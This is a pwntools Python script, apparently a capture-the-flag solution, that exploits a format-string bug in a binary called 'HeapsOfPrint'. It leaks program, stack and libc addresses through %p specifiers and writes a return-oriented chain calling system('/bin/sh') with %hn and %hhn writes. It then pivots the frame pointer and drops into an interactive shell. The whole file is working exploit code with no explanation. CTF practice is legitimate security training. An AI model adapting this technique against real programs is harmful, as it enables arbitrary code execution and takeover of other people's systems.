from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

file = "./HeapsOfPrint"
libc = ELF("libc.so.6")

env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}

#conn = remote("flatearth.fluxfingers.net", 1747)
conn = process(file, env=env)
#gdb.attach(conn, """
#break *do_that + 51
#""")

def write_first(suffix):
    conn.recvuntil("character is ")
    stack_off = ord(conn.recvn(1)) - 0x17
    off_2 = 0xb3 - stack_off - 8 - 2
    if off_2 < 0:
        off_2 += 0x100
    fmt = "%1c"*4 \
          + "%" + str(stack_off + 8 - 4) + "c%hhn" \
          + "%1c"*2 \
          + "%" + str(off_2) + "c%hhn" \
          + suffix
    conn.sendline(fmt)

def write(data, offset, rbp_off, g):
    conn.recvuntil("character is ")
    off_2 = 0xb3 - rbp_off - 2 + 0x10000
    fmt = "%1c"*4 \
          + "%" + str(rbp_off - 4) + "c%hn" \
          + "%1c"*2 \
          + "%" + str(off_2) + "c%hhn"
    off_3 = offset - 0xb3 - 5 - 3*g
    fmt += "%1c"*(5 + 3*g) \
           + "%" + str(off_3) + "c%hn"
    off_4 = data - offset - 29
    if off_4 < 0:
        off_4 += 0x10000
    fmt += "%1c"*(29) \
           + "%" + str(off_4) + "c%hn"
    conn.sendline(fmt)

def write_payload(payload, offset, rbp_off):
    i = 0
    while len(payload) != 0:
        data = payload[0:2]
        write(int(data[::-1].encode('hex'), 16), (offset + i*2), rbp_off - 3*8 - 3*8*(i+1), i)
        i += 1
        payload = payload[2:]

write_first(
    suffix = "aaaa%12$p" \
    + "bbbb%6$p" \
    + "cccc%17$p" \
    + "dddd")

conn.recvuntil("aaaa")

prog_base = u64(("\x00\x00" + conn.recvuntil("bbbb")[2:-4].decode('hex'))[::-1]) - 0x990

rbp = u64(("\x00\x00" + conn.recvuntil("cccc")[2:-4].decode('hex'))[::-1])
rbp_off = rbp % 0x10000

system_addr = u64(("\x00\x00" + conn.recvuntil("dddd")[2:-4].decode('hex'))[::-1]) \
              + 0x78390 - 0x53830
bin_sh_addr = system_addr + next(libc.search("/bin/sh")) - libc.symbols['system']

offset = (rbp & 0xffff) + 0x150

pop_rdi_addr = prog_base + 0x009f3

payload = p64(pop_rdi_addr) \
          + p64(bin_sh_addr) \
          + p64(system_addr)

write_payload(payload, offset, rbp_off)

# Now updating ebp to point to our offset

conn.recvuntil("character is")

off = rbp_off + 0x3208 - 0x3360

# Return to main
main_addr = prog_base + 0x906

off2 = main_addr % 0x10000 - off - 8 - 2
if off2 < 0:
    off2 += 0x10000

fmt = "%1c"*4 \
      + "%" + str(off + 8 - 4) + "c%hn" \
      + "%1c"*2 \
      + "%" + str(off2) + "c%hn"

conn.sendline(fmt)

# Now modify rbp
fmt = "%" + str(offset - 8) + "c%6$hn"

conn.sendline(fmt)

conn.interactive()
